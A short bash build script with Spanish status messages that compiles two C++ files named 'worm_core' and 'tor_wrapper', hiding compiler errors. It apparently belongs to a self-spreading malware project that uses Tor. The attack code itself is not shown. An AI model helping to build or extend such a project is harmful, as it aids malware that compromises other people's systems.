#!/bin/bash
echo "[*] Compilando binarios..."
g++ -std=c++20 -O2 -pthread worm_core.cpp -o worm_core 2>/dev/null
g++ -std=c++20 -O2 tor_wrapper.cpp -o tor_wrapper 2>/dev/null
echo "[+] Build completo."